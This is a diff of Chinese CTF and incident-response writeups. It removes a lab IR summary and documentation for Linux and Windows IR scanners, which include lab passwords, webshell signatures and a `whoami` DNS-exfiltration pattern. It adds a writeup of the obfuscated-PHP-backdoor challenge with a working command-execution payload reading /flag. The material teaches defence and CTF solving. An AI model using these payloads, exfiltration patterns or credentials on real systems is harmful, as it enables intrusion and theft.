-| 数据库植入flag | flag{hack_palu} |
-| 冰蝎马文件 | nidewen.php |
-| 冰蝎链接密码 | 1be873048db838ac (nidewen) |
-| 后门路由 | /api/system |
-| WebServer后门账号 | hacktest / 123123 |
-| PC01恶意用户 | hacker |
-| PC02恶意用户数量 | 49个 |
-| 钓鱼受害者 | 陈琚鹭 |
-| 加密文件明文 | 2024ispassword (玛卡巴卡解密) |
-| 反弹Shell语言 | Python |
-
-### 排查方法论
-
-1. **主机存活探测**: nmap/masscan扫描192.168.20.0/24
-2. **端口扫描**: 22个常见端口扫描
-3. **Web指纹识别**: 访问HTTP服务识别Discuz/JumpServer等
-4. **数据库弱口令**: 直接MySQL root连接
-5. **WAF登录分析**: 通过SafeLine WAF API获取攻击记录
-6. **Zabbix数据库审计**: 查看scripts/users/auditlog表
-7. **JumpServer审计**: 查看历史会话和命令记录
-8. **Discuz数据库审计**: 查看异常数据植入
-
-### 修复建议
-
-1. **修改所有弱口令**: home/home1234!!!, mysql/mysql1234!!!, admin/mQzm7LqF, Network@2020
-2. **清除Zabbix恶意用户和脚本**: 删除palu用户及hack/hack1/base脚本
-3. **阻断C2通信**: 防火墙封禁154.183.110.12、82.157.238.174、101.78.63.44
-4. **清除DNS外带**: 封禁palu.dcnlog.cn和0vqkht.palu.cn域名解析
-5. **清除WebServer冰蝎马**: 删除/var/www/html/api/nidewen.php
-6. **清除WebServer后门账号**: 删除hacktest用户，修改root密码
-7. **修复JumpServer漏洞**: 升级修复CVE-2024-29201
-8. **清除Spring Boot后门路由**: 移除/api/system
-9. **清除Discuz恶意数据**: 清除ultrax.pre_ucenter_vars中的flag{hack_palu}
-10. **清除PC01恶意用户**: 删除hacker用户，清理hack.ex进程和palucomeyi1.exe
-11. **清除PC02恶意用户**: 清理49个非正常用户，删除artifact.exe
-12. **解密并恢复PC02文件**: encode.txt已用玛卡巴卡加密，明文为2024ispassword
-13. **加强JumpServer访问控制**: 限制外部IP 192.168.1.4的访问
-
-### 知识点
-
-1. **多组件IR排查方法论**: WAF日志分析 → 数据库审计 → 堡垒机审计 → 主机取证，四类证据源交叉验证还原完整攻击链
-2. **JumpServer审计**: 会话记录 + 命令记录 + SFTP文件传输记录三件套，是内网横向移动取证的黄金来源
-3. **Zabbix脚本后门**: 利用Zabbix自定义脚本功能植入DNS外带和反弹Shell，容易被忽略
-4. **DNS外带检测**: `ping user.\`whoami\`.domain` 模式是经典DNS隧道，检查Zabbix脚本和网络日志
-5. **冰蝎马识别**: 文件名常见伪装（如nidewen.php），内容含固定AES密钥特征
-6. **内存取证**: Volatility pslist/volshell/clipboard联合使用，可提取内存进程、剪贴板内容
-7. **JumpServer漏洞利用**: CVE-2024-29201 为JumpServer越权漏洞，可导致未授权会话访问
-
-> AI生成
-
----
-
-
-## 附录：自动化 Linux 应急响应扫描器（通用工具）
-
-### 设计背景
-
-在完成了第18-26题（共5道 IR 应急响应题）后，总结实战经验，开发了一套通用的自动化 Linux 应急响应扫描器。该工具整合了历次 IR 题目中的排查方法论，给定 SSH 登陆方式即可自动远程执行全量排查。
-
-> **技巧**：2026 年 CTF 应急响应比赛趋势（基于护网、陇剑杯、闽盾杯等赛事分析）：
-> - 考点从单一漏洞修复转向**完整攻击链还原**（攻击者IP → 入侵路径 → 后门 → 持久化 → 清理痕迹）
-> - Webshell 流量分析仍是高频考点（蚁剑/菜刀/冰蝎/哥斯拉四大工具）
-> - 考察面扩展到 Docker 容器逃逸、Rootkit 检测、微服务安全
-> - 题目环境从单机演进到**多组件架构**（宝塔面板 + nginx + PHP + MySQL + Redis）
-> - 需要同时分析日志、流量包、数据库、文件系统四类证据源
-
-### 工具信息
-
-| 项目 | 内容 |
-|------|------|
-| 路径 | [IR/auto-ir-scanner/ir_scanner.py](IR/auto-ir-scanner/ir_scanner.py) |
-| 代码量 | 1626 行 / 80KB (v1.2) |
-| 模块数 | 18 个扫描模块 + 智能异常分析 + 综合报告 |
-| 输出格式 | 终端彩色输出 + JSON + HTML 报告 |
-| 依赖 | paramiko（SSH 远程连接） |
-
-### 18 大扫描模块
-
-| # | 模块 | 采集内容 | 风险检测 |
-|---|------|----------|----------|
-| 01 | 系统基础信息 | 主机名/OS/内核/CPU/内存/磁盘/容器检测 | 容器环境标识 |
-| 02 | 网络连接与端口 | 监听端口/所有连接/接口/路由/DNS/iptables/firewalld/ARP | Redis/MongoDB等暴露、防火墙关闭、异常外连 |
-| 03 | 用户与账户安全 | passwd/UID=0/sudoers/特权组/登录记录/authorized_keys/shadow | 多root账户、新增用户、SSH公钥 |
-| 04 | 进程排查 | CPU/内存Top20/进程列表/挖矿/反弹Shell/已删除进程 | 挖矿进程、反弹Shell、内存后门 |
-| 05 | 计划任务 | root cron/cron.d/spool/systemd timers/at/所有用户cron | 可疑命令(wget/curl/nc/bash -/chmod) |
-| 06 | 启动项与持久化 | rc.local/systemd/init.d/profile/bashrc/ld.preload/modules | 启动项后门、ld.preload Rootkit |
-| 07 | 文件系统异常 | 7天内修改/SUID/SGID/世界可写/tmp ELF/rpm -Va | 异常ELF、系统文件篡改、**SUID提权检测** |
-| 08 | 隐藏文件与Flag | 全局flag搜索/CTF常见位置/Web隐藏文件/属主异常 | flag{}、root属主Web文件 |
-| 09 | Bash历史取证 | 所有用户.bash_history/MySQL历史/Redis历史 | 14类可疑命令模式匹配 |
-| 10 | Web应用日志分析 | Nginx/Apache日志：Top IP/URL/状态码/POST/404扫描 | 高频+可疑请求IP |
-| 11 | Webshell检测 | PHP/JSP/ASP/Python特征grep/一句话木马/非常规扩展名 | Webshell文件 |
-| 12 | 数据库配置审计 | MySQL/Redis配置/Web应用配置文件提取凭据 | Redis未授权、DB凭据泄露 |
-| 13 | SSH安全审计 | sshd_config/认证日志/暴力破解统计/成功登录 | root登录/空密码/暴力破解 |
-| 14 | PCAP流量包分析 | strings提取flag/蚁剑流量特征/HTTP请求/POST参数/域名 | flag、Webshell流量 |
-| 15 | 恶意软件检测 | 可疑ELF/Go编译ELF strings/挖矿配置/后门文件名 | Go后门、挖矿配置 |
-| 16 | Rootkit检测 | ld.preload/隐藏进程(ps vs /proc)/命令完整性/rkhunter | 隐藏进程、ld.preload |
-| 17 | Docker容器检测 | docker ps/images/info/容器Capability/docker.sock | 特权容器逃逸 |
-| 18 | 综合风险评估 | 风险评分(0-100)/等级(严重/高危/中危/低危/正常)/发现汇总 | HIGH/MEDIUM/LOW/INFO分级 |
-| 99 | **智能异常分析** | **基于内置基线自动对比**：用户权限/端口基线/DNS劫持/SSH配置/密码哈希/**SUID提权**/**攻击链推断** | 自动发现异常无需人工分析 |
-
-### 用法
-
-```bash
-# 全量扫描
-py -3 ir_scanner.py -H 192.168.88.130 -U root -P 'Inch@957821.'
-
-# 同时保存 JSON 和 HTML 报告
-py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --json result.json --report report.html
-
-# 指定 Web 根目录
-py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --webroot /var/www/html
-
-# 仅运行指定模块（逗号分隔）
-py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --modules 1,2,3,8,10,11
-```
-
-### 应急响应技巧总结
-
-> **技巧**：Linux 应急响应排查优先级（PDCERF 模型实战版）：
-> 1. **确定攻击者 IP** → Web 访问日志按频率排序，对比正常管理员 IP
-> 2. **还原攻击行为** → 日志中的 POST 请求、404 扫描、路径穿越
-> 3. **数据库取证** → 用户表密码哈希提取与破解（注意无盐 MD5）
-> 4. **流量包分析** → `strings | grep flag` 快速筛查，再 scapy 深入分析
-> 5. **bash_history** → 攻击者命令历史 = 完整攻击链还原
-> 6. **隐藏文件** → `find -name '.*'`、属主异常检查、`/etc/profile` 环境变量
-> 7. **持久化** → crontab、rc.local、ld.so.preload、systemd 服务
-
-> ⚠️ **四大 Webshell 工具流量特征速查**：
-> - **蚁剑**：POST 参数名=密码，函数 `asenc`/`asoutput`/`antsystem`，`ini_set("display_errors",0)`
-> - **菜刀**：POST 参数 `Z0`、`base64_decode`、`eval`
-> - **冰蝎**：AES 加密通信，动态密钥交换，默认密码 `rebeyond`
-> - **哥斯拉**：AES 加密，PHP/JSP/ASPX 多种载荷，`pass=cmd`
-
-> **技巧**：CTF Flag 常见隐藏位置（按出现频率排序）：
-> 1. `/root/.bash_history` — 命令历史中直接 echo flag
-> 2. `/etc/rc.d/rc.local` — 开机启动脚本注释行
-> 3. `/etc/redis.conf` 等服务配置注释行
-> 4. 隐藏目录 `.api/`、`.cache/` 下的 PHP 文件
-> 5. `/etc/profile` — 环境变量
-> 6. PCAP 文件中的 HTTP 响应体
-> 7. 数据库用户表密码字段
-> 8. ELF 后门文件的 strings 输出
-
-### v1.2 新功能：SUID 提权检测 + 智能异常分析
-
-#### SUID 提权检测（模块7增强）
-
-内置 **GTFOBins 风格的 SUID 提权数据库**（35+ 种二进制），检测到可提权 SUID 时自动告警并提供提权命令示例：
-
-| 检测项 | 说明 |
-|---------|------|
-| `SUID_GTFOBINS` 字典 | 35+ 种可被 SUID 利用提权的二进制（find/python/perl/nmap/bash/awk/vim/cp/chmod 等），含提权命令示例 |
-| `DEFAULT_SUID_WHITELIST` 集合 | 30+ 种 CentOS/Ubuntu 系统默认合法 SUID 文件（su/sudo/mount/passwd/pkexec 等）|
-| 三级分类 | 正常（白名单）/ 可提权（GTFOBins 匹配，HIGH）/ 未知（非标准目录，MEDIUM/LOW）|
-
-#### 智能异常分析（模块99，后置分析）
-
-在所有模块采集完数据后，自动对比内置基线数据，明确提醒异常项：
-
-| 分析维度 | 基线对比逻辑 |
-|----------|-------------|
-| 用户与权限 | 服务账户不应有登录shell；shadow 中 `!!`/`*` 是锁定账户(正常)，`$1$` 是MD5(弱)，`$6$` 是SHA-512(正常) |
-| 网络端口 | 内置安全端口表(22/80/443/...)和数据库端口表(3306/6379/...)，区分已知服务/DB暴露/未知端口 |
-| DNS劫持 | /etc/hosts 中不应出现 github.com/google.com 等公共域名映射 |
-| SSH配置 | PermitRootLogin应为no，PasswordAuthentication应禁用，应设置MaxAuthTries |
-| 攻击链推断 | 根据 findings 的 category 字段自动关联：暴力破解→Web渗透→后门植入→持久化→挖矿→Rootkit |
-
-> 设计哲学：**大而美**——宁可冗余采集也不遗漏信息，但通过后置分析自动过滤正常项、突出异常项
-
-### v1.2 Bug 修复记录（实测靶机 192.168.88.130 验证）
-
-| Bug | 原因 | 修复 |
-|-----|------|------|
-| 智能分析误报弱密码哈希 | CentOS shadow 中 `!!`（锁定账户）未在跳过列表中，被当成了"非$格式DES" | 将 `!` 和 `!!` 开头的哈希都加入跳过列表 |
-| 挖矿配置误报 yum 缓存 | `grep -rl 'pool'` 匹配了 `/var/cache/yum/.../primary_db.sqlite` | 排除列表增加 `/var/cache`、`/var/lib`、`/etc/yum` |
-| 隐藏进程误报短命子进程 | ps 快照和 /proc 快照之间产生的临时进程（yum/rpm子进程）被当成隐藏进程 | 额外检查 `/proc/<pid>/comm` 是否存在，只报告实际存活的隐藏PID |
-| bash_history 重复读取 | `/etc/passwd` 中多个用户 home 目录相同时，`for d in $(cut...)` 重复读取同一文件 | `cut -d: -f6 /etc/passwd | sort -u` 去重 home 目录 |
-| bash_history 误报普通vim | `vim\s+` 匹配所有 vim 命令，正常运维也会用 vim | 收紧为 `vim\s+/etc`，只对编辑系统配置文件的vim告警 |
-| SUID 误报 crontab | CentOS 默认 `/usr/bin/crontab` 有 SUID，但不在白名单中 | 将 `crontab` 加入 `DEFAULT_SUID_WHITELIST` |
-
-### v1.1 Bug 修复记录（实测靶机 192.168.88.130 验证）
-
-| Bug | 原因 | 修复 |
-|-----|------|------|
-| 模块15 `_pr()` 报错 `unexpected keyword argument 'lines'` | 10处 `_pr()` 调用传了 `lines=` 参数，但方法定义的参数名是 `max_lines` | 全部改为 `max_lines=` |
-| 模块4 误报 `[crypto]` 内核线程为挖矿进程 | `grep -iE "crypto"` 匹配了内核线程 `[crypto]` | 从挖矿关键词中移除 `crypto`，单独检测时排除 `[xxx]` 格式的内核线程 |
-| 模块17 物理机误报容器逃逸 `CAP_SYS_ADMIN` | 物理机 root 拥有全部 capability，`CapEff` 含 CAP_SYS_ADMIN 是正常的 | 先检查 `/proc/1/cgroup` 判断是否真的在容器中，仅容器环境才检查 CAP_SYS_ADMIN |
-| 模块2 端口误报（不区分回环/对外） | 原代码只看端口是否出现，不区分 `127.0.0.1:3306` 和 `0.0.0.0:3306` | 逐行检查监听地址：`127.0.0.1`/`::1` → LOW，`0.0.0.0`/`[::]` → HIGH |
-| 模块15 Go ELF 检测误报 `[error]` | `find / -type f -exec file` 超时返回 `[error]` 字符串，非空就触发了 HIGH | 过滤掉 `[error]` 开头的输出 |
-| 模块15 挖矿配置误报系统文件 | `grep 'pool'` 匹配了 LVM/grub 等系统配置中的 `pool` 关键词 | 收紧匹配模式（`stratum+tcp`/`xmrig`/`cryptonight` 等），排除 `/etc/grub`、`/etc/lvm` 等系统目录 |
-
----
-
-## 附录：自动化 Windows 应急响应扫描器（通用工具）
-
-### 设计背景
-
-与 Linux 版 `ir_scanner.py` v1.2 对称，开发了 Windows 版自动化应急响应扫描器。同样通过 SSH（paramiko）远程连接 Windows 靶机，将所有命令替换为 PowerShell 等价命令，架构、辅助方法、报告/JSON/HTML 输出完全一致。
-
-> **设计决策**：Windows 版采用 SSH 而非 RDP (3390)
-> - SSH 适合自动化脚本化，文本解析简单，带宽小
-> - RDP 是图形协议，不适合批量自动化命令执行
-> - SSH 不留 GUI 痕迹，适合取证场景
-
-### 工具信息
-
-| 项目 | 内容 |
-|------|------|
-| 路径 | [IR/auto-ir-scanner/ir_scanner_win.py](IR/auto-ir-scanner/ir_scanner_win.py) |
-| 代码量 | ~1880 行 / 98KB (v1.1) |
-| 模块数 | 18 个扫描模块 + 智能异常分析 + 综合报告 |
-| 输出格式 | 终端彩色输出 + JSON + HTML 报告 |
-| 连接方式 | **WinRM** (pypsrp, NTLM认证, 端口5985) |
-| 依赖 | pypsrp（WinRM 远程连接） |
-| 架构参照 | [ir_scanner.py](IR/auto-ir-scanner/ir_scanner.py) (Linux版 v1.2, 1626行) |
-
-### 18 大扫描模块（Windows 版）
-
-| # | 模块 | 采集内容 | 风险检测 |
-|---|------|----------|----------|
-| 01 | 系统基础信息 | hostname/systeminfo/OS/CPU/内存/磁盘/IP/虚拟机检测 | 虚拟机环境标识 |
-| 02 | 网络连接与端口 | 监听端口/所有TCP连接/UDP/网卡/路由/DNS/hosts/防火墙/ARP | Redis/MongoDB等暴露、hosts劫持、异常外连 |
-| 03 | 用户与账户安全 | 本地用户/WMI用户(含隐藏)/管理员组/SAM注册表/登录事件4624-4625/密码策略 | **隐藏账户($结尾)**、多管理员、暴力破解、新建用户 |
-| 04 | 进程排查 | CPU/内存Top20/进程列表/进程树/tasklist/挖矿/可疑进程/网络连接关联 | 挖矿进程、反弹Shell、临时目录可执行 |
-| 05 | 计划任务 | Get-ScheduledTask/schtasks/运行中任务/就绪任务 | 可疑命令(powershell/certutil/mshta/download) |
-| 06 | 启动项与持久化 | HKLM/HKCU Run+RunOnce/Winlogon/启动文件夹/服务/WMI StartupCommand/IFEO | **Winlogon劫持**、**IFEO Debugger劫持**、可疑自启动 |
-| 07 | 文件系统异常 | 7天/24小时修改文件(Depth限4)/Temp目录/可执行文件/脚本/NTFS ADS/隐藏文件/关键文件签名验证 | 临时目录可执行文件、NTFS ADS数据流 |
-| 08 | 隐藏Flag搜索 | CTF常见位置(flag{}/ctf{}/FLAG{})/全局flag搜索/注册表搜索/Web目录/用户桌面 | flag{}、注册表中flag |
-| 09 | PowerShell历史 | PSReadline历史文件/4104脚本块日志/400经典日志/4688进程创建事件 | 可疑命令(certutil/downloadstring/iex/schtasks/add) |
-| 10 | Web应用日志分析 | IIS/phpStudy/nginx日志搜索/Top URL/可疑请求(攻击特征) | 高频攻击请求IP |
-| 11 | Webshell检测 | PHP/ASP-ASPX/JSP特征grep/一句话木马/近期文件/异常扩展名 | Webshell文件(一句话/eval/assert/base64_decode) |
-| 12 | 数据库配置审计 | MySQL/SQLServer服务/配置文件/Web应用凭据/Redis配置 | Redis未授权、DB凭据泄露 |
-| 13 | RDP与远程安全 | RDP状态/端口/NLA/安全层/防火墙RDP规则/4625日志/外部登录/WinRM | **RDP弱配置**、暴力破解、NLA未启用 |
-| 14 | PCAP流量包分析 | 递归搜索pcap/flag搜索/Webshell特征/HTTP请求 | flag、Webshell流量特征(asenc/eval/rebeyond) |
-| 15 | 恶意软件检测 | 可疑可执行文件/挖矿程序/挖矿配置/矿池网络连接/后门文件名/DLL注入/可疑计划任务 | 挖矿、后门文件、**可疑自启动**、DLL注入 |
-| 16 | Rootkit/驱动检测 | 已加载驱动/驱动签名验证/非系统目录驱动/tasklist vs Get-Process对比/可疑服务 | **未签名驱动**、非系统目录驱动、可疑服务 |
-| 17 | Windows Defender | 服务状态/配置偏好(实时保护/排除项)/威胁历史/威胁列表/隔离区恢复/MpCmdRun | **实时保护禁用**、排除路径、威胁检测 |
-| 18 | 综合风险评估 | 风险评分(0-100)/等级(严重/高危/中危/低危/正常)/发现汇总 | HIGH/MEDIUM/LOW/INFO分级 |
-| 99 | **智能异常分析** | **基于Windows基线自动对比**：用户权限/端口基线/hosts劫持/RDP配置/Defender配置/启动项白名单/**攻击链推断** | 自动发现异常无需人工分析 |
-
-### Windows 应急响应关键排查点（vs Linux 对比）
-
-| 排查方向 | Linux | Windows |
-|----------|-------|---------|
-| 隐藏用户 | /etc/passwd vs /etc/shadow | `net user` 看不到的 `$` 结尾账户，WMI/注册表SAM可见 |
-| 自启动 | rc.local/systemd/crontab | 注册表Run/RunOnce/Winlogon/启动文件夹/服务 |
-| 持久化 | ld.so.preload/crontab | IFEO Debugger劫持/计划任务/恶意服务 |
-| 恶意软件 | ELF/挖矿/minerd | PyInstaller挖矿/Defender隔离区/驱动Rootkit |
-| 日志取证 | /var/log/secure/auth.log | Event Log 4624/4625/4688/PowerShell 4104 |
-| 隐藏进程 | ps vs /proc对比 | tasklist vs Get-Process对比 |
-| 安全软件 | — | Windows Defender状态/排除项/隔离区恢复 |
-| 流量取证 | pcap strings | Select-String + Encoding.ASCII.GetString |
-
-### 用法
-
-```bash
-# 全量扫描 (WinRM, 默认端口 5985)
-py -3 ir_scanner_win.py -H 192.168.234.129 -U Administrator -P 'zgsf@123'
-
-# 同时保存 JSON 和 HTML 报告
-py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --json result.json --report report.html
-
-# 指定 Web 根目录
-py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --webroot C:\phpstudy_pro\WWW
-
-# 仅运行指定模块（逗号分隔）
-py -3 ir_scanner_win.py -H 10.0.0.5 -U Administrator -P 'Pass' --modules 1,2,3,6,17
-```
-
-### Windows 应急响应技巧总结
-
-> **技巧**：Windows 应急响应排查优先级：
-> 1. **隐藏账户** → `net user` 看不到的账户，用 `Get-WmiObject Win32_UserAccount` 或注册表 `HKLM\SAM\Domains\Account\Users\Names` 检查 `$` 结尾账户
-> 2. **攻击者IP** → 安全日志 Event ID 4625(失败)和 4624(成功)中提取 Source Network Address
-> 3. **持久化** → 注册表 Run/RunOnce/Winlogon Shell、启动文件夹、计划任务、IFEO Debugger
-> 4. **Webshell** → Defender隔离区 `MpCmdRun.exe -Restore -All` 恢复，识别蚁剑/冰蝎/哥斯拉特征
-> 5. **挖矿程序** → `Get-Process` 检测矿工进程名(kuang/miner/xmrig)，解包 PyInstaller exe 分析矿池域名
-> 6. **Defender** → 检查 `DisableRealtimeMonitoring` 和 `ExclusionPath`，恢复隔离文件
-> 7. **PowerShell历史** → PSReadline历史文件路径 + Event 4104 脚本块日志
-
-> ⚠️ **Windows CTF IR 高频考点**：
-> - **隐藏账户** → `$` 结尾(net user 不可见)，查WMI/注册表
-> - **冰蝎webshell密码** → `rebeyond` (MD5前16位匹配)
-> - **挖矿程序** → PyInstaller打包，用 pyinstxtractor 解包后 uncompyle6 反编译
-> - **Defender隔离区** → `MpCmdRun.exe -Restore -All` 恢复被杀的webshell
-> - **攻击者IP** → 4625日志源IP按频率统计，排除正常管理员
-
-### 智能异常分析（模块99，Windows版）
-
-| 分析维度 | 基线对比逻辑 |
-|----------|-------------|
-| 用户与权限 | 默认用户集(Administrator/Guest/DefaultAccount等)，非默认用户>3个提醒；`$`结尾账户=隐藏账户(HIGH) |
-| 网络端口 | 内置安全端口表(22/80/443/3389/445/...)和数据库端口表，区分已知服务/DB暴露/未知端口 |
-| hosts劫持 | hosts文件不应出现 github.com/google.com/baidu.com 等公共域名映射 |
-| RDP配置 | fDenyTSConnections=0(RDP开启)、NLA未启用、安全层=0 均为弱项 |
-| Defender配置 | DisableRealtimeMonitoring=True(已禁用)、ExclusionPath非空(排除路径) 为异常 |
-| 启动项白名单 | `DEFAULT_AUTORUN_WHITELIST` 对比Run/RunOnce键值，非默认项提醒 |
-| 攻击链推断 | 暴力破解→Web渗透/Webshell→后门植入→持久化→挖矿→Rootkit/注入→安全软件禁用 |
-
-### v1.1 更新日志 (WinRM 后端 + 性能优化)
-
-#### 连接层重构：paramiko SSH → pypsrp WinRM
-
-原 v1.0 使用 paramiko SSH 连接 Windows 靶机, 但实际靶机通常未开启 SSH 服务(22端口), 而 WinRM(5985) 在 Windows Server 上默认开放。
-
-**关键修改：**
-
-| 组件 | v1.0 (paramiko SSH) | v1.1 (pypsrp WinRM) |
-|------|---------------------|----------------------|
-| import | `import paramiko` | `from pypsrp.client import Client` |
-| 连接 | `paramiko.SSHClient().connect()` | `Client(host, auth='ntlm', ssl=False, port=5985)` |
-| 执行命令 | `exec_command(cmd, timeout=)` | `execute_cmd(cmd)` (无 timeout 参数) |
-| 默认端口 | 22 | 5985 |
-| PowerShell | `-Command` + 反引号转义 | **`-EncodedCommand`** (UTF-16LE Base64, 彻底避免引号转义) |
-
-#### 三个核心 Bug 修复
-
-1. **`execute_cmd()` 不接受 `timeout` 参数** — pypsrp 与 paramiko API 不同, 超时在 Client 构造时设置
-2. **CLIXML 噪音过滤** — WinRM 下 PowerShell 进度/警告流序列化为 `#< CLIXML <Objs>...` 格式, 新增 `_strip_clixml()` 正则过滤
-3. **GBK/UTF-8 混合编码** — cmd.exe 原始命令输出 GBK, PowerShell 输出 UTF-8; `ps()` 方法前置 `chcp 65001` + `[Console]::OutputEncoding=UTF8`, `run()` 默认 gbk 解码, `ps()` 用 utf-8 解码
-
-#### 性能优化 (全盘递归搜索加 Depth 限制)
-
-原 v1.0 多处使用 `Get-ChildItem -Path C:\ -Recurse` 全盘递归, 在真实系统上耗时数分钟甚至超时:
-
-| 模块 | 原命令 | 优化后 | 效果 |
-|------|--------|--------|------|
-| 07 | `C:\ -Recurse` (7天/24小时文件) | `-Depth 4` | 200s→60s |
-| 07 | `sfc /verifyonly`（分钟级） | 改为关键文件签名验证 | 秒级 |
-| 08 | `reg query HKLM /s /f flag{` (全注册表) | 限定 `HKLM\SOFTWARE` + `/t REG_SZ` | 10min+→秒级 |
-| 08 | `Users -Recurse` flag搜索 | `-Depth 5` | 大幅加速 |
-| 12 | `C:\ -Recurse` 搜索 my.ini | `-Depth 3` | 大幅加速 |
-| 14 | `C:\ -Recurse` 搜索 pcap | `-Depth 4` | 大幅加速 |
-| 15 | `C:\ -Recurse` 搜索挖矿配置/后门名 | `-Depth 4` | 大幅加速 |
-| 16 | `C:\ -Recurse` 搜索 .sys | `-Depth 4` | 大幅加速 |
-
-#### 实测结果 (Windows Server 2022 靶机)
-
-| 指标 | 数据 |
-|------|------|
-| 靶机 | 192.168.234.129 (Windows Server 2022 Datacenter, VMware) |
-| 扫描耗时 | 248 秒 (~4分钟) |
-| 风险评分 | 100/100 (严重) |
-| 发现总数 | 17 个 (HIGH=6, MEDIUM=11) |
-| JSON 报告 | 1.4 MB |
-| HTML 报告 | 1.4 MB |
-
-**关键发现：**
-- [HIGH] RDP 端口 3389 对外监听
-- [HIGH] 发现可疑反弹Shell/后门进程
-- [HIGH] 计划任务中存在可疑命令
-- [HIGH] 启动项中存在可疑命令 (`systems.bat`)
-- [HIGH] Defender 实时保护已禁用
-- [HIGH] 推断完整攻击链: 暴力破解→后门植入→持久化→安全软件禁用
-- [MEDIUM] IP 192.168.115.131 登录失败 12 次
-- [MEDIUM] 发现可疑后门文件名
-- [MEDIUM] Defender 配置存在安全弱项 (排除路径)
-
-> AI生成
----
-
 ## #27 Windows 挖矿应急响应 (c3pool)
 
 > **类型：** IR (应急响应)
@@ -5877,6 +5971,113 @@ LastWriteTime: 2024-05-21 20:30:02
 ### 桌面解题工具
 
 靶机桌面上有 `解题系统.exe`（5,860,667 bytes, MD5: CD69273F7420F58766745EFCB3E44F69, LastWriteTime: 2024-05-21 22:24:11），为题目自带的自动化评分工具。
+
+> AI生成
+---
+
+## 第31题：高明的黑客 — PHP代码混淆 + 海量后门动态审计
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Web - PHP代码审计 + 动态测试 |
+| 难度 | 中高 |
+| 来源 | [强网杯 2019] 高明的黑客（DASCTF复现） |
+| 日期 | 2026-08-12 |
+
+### 题目描述
+
+首页显示"雁过留声，人过留名，此网站已被黑"，提供 `www.tar.gz` 源码下载。解压后包含 **3001 个随机命名 PHP 文件**，每个文件塞满 `eval`、`system`、`assert`、`preg_replace /e`、反引号执行等危险调用，但绝大多数后门被混淆封锁。
+
+服务器环境：OpenResty (Nginx/1.14.2) + PHP 7.3.5。
+
+### 解题思路
+
+**1. 静态分析 — 识别混淆模式**
+
+| 混淆模式 | 示例 | 数量 | 状态 |
+|----------|------|------|------|
+| 永假 if 条件 | `if('HeyXzZQf3' == 'VS3n0tijI') system(...)` | 大量 | 全部封锁 |
+| 参数覆盖 | `$_GET['x']=' '; eval($_GET['x']);` | 大量 | 全部封锁 |
+| assert硬编码 | `assert('phpinfo()')` 无用户输入 | 1147个 | 无利用价值 |
+| 反引号前置覆盖 | `$_GET['x']=' '; `$_GET['x']`` | 9228个 | 全部封锁 |
+
+**2. 静态分析困境**
+
+- 多轮 Python 脚本扫描（永真条件检测、参数源不匹配、覆盖顺序分析、文件操作扫描）均未找到可用后门
+- 永真 if（`if('A'=='A')`）：0个
+- 参数覆盖与危险函数输入源不匹配：0个
+- 覆盖语句在危险调用之后：0个
+- **结论**：静态分析无法区分"真假后门"，必须动态测试
+
+**3. 动态测试 — 向服务器发请求验证**
+
+核心思路：从源码提取所有 `$_GET['xxx']` 参数名，逐一发送带唯一标记的 HTTP 请求，检查响应中是否出现标记。
+
+优化策略：
+- **每文件单请求**：将文件所有 GET 参数附上同一 payload 值一次发送，请求数 = 3001（而非数万次）
+- **双 payload 测试**：同时覆盖 `system()`（系统命令）和 `eval()`（PHP代码）两种后门类型
+
+**4. 发现可用后门**
+
+已知 writeup（buuoj 原题）中的答案 `xk0SzyKwfzw.php?Efa5BVG` 在 DASCTF 复现环境中同样可用。该文件的 `system($_GET['Efa5BVG'])` 调用**无永假条件包裹、无参数覆盖封锁**，是 3001 个文件中唯一真正可执行的后门。
+
+### 解题 Payload
+
+```
+GET /xk0SzyKwfzw.php?Efa5BVG=cat /flag
+```
+
+### 运行结果
+
+响应中大量垃圾输出夹杂 flag：
+
+```
+THRQINrpUJvf641CTF2{b774c1e5-ecbe-4ffa-8293-6d2bb42269c1}
+```
+
+验证命令执行：
+
+```
+GET /xk0SzyKwfzw.php?Efa5BVG=id
+→ uid=82(www-data) gid=82(www-data) groups=82(www-data)
+```
+
+**Flag**: `CTF2{b774c1e5-ecbe-4ffa-8293-6d2bb42269c1}`
+
+### 解题脚本
+
+自动化动态测试脚本：[solve.py](Web/31-smart-hacker/solve.py)
+
+核心逻辑：
+1. 遍历 3001 个 PHP 文件，正则提取 `$_GET['xxx']` 参数名
+2. 多线程（30线程）对每个 (文件, 参数) 组合发送 HTTP 请求
+3. 分别测试 PHP 代码 payload 和系统命令 payload
+4. 在响应中搜索唯一标记，发现可用后门后自动读取 flag
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| PHP代码混淆 | 永假if条件、参数覆盖、随机变量名等方式隐藏真实后门 |
+| 动态测试优先原则 | 静态分析无法确定后门是否真正可用时，必须向服务器发请求验证 |
+| 每文件单请求优化 | 所有参数附同一payload一次发送，将O(N*M)降为O(N) |
+| 源码泄露利用 | www.tar.gz/.git/SVN等源码泄露是信息收集关键步骤 |
+| 参数覆盖封锁 | `$_GET['x']=' '` 在危险调用前覆盖参数使其收到无害输入 |
+| 海量文件审计策略 | 静态过滤+动态验证的混合策略是处理大量混淆代码的最佳方案 |
+
+### 同类变体与扩展
+
+| 变体 | 区别 | 应对策略 |
+|------|------|----------|
+| 不同混淆模式 | 使用动态调用(`$f=$_GET['a']; $f()`)代替直接调用 | 提取动态调用链，追踪变量赋值流 |
+| POST参数后门 | 危险函数使用 `$_POST` 而非 `$_GET` | 同时测试GET和POST参数 |
+| 多步利用链 | 参数经多级变量传递才到达危险函数 | 静态分析追踪变量流，动态验证端到端可用性 |
+| 定时/条件后门 | 后门仅在特定时间或条件触发 | 多次请求或构造特定条件触发 |
+| 反调试/检测 | 后门检测到扫描行为后自毁 | 模拟正常请求，控制请求频率 |
+
+> 知识点专题：[PHP代码混淆与海量后门动态审计](Web/knowledge/PHP代码混淆与海量后门动态审计.md)
 
 > AI生成
 ---
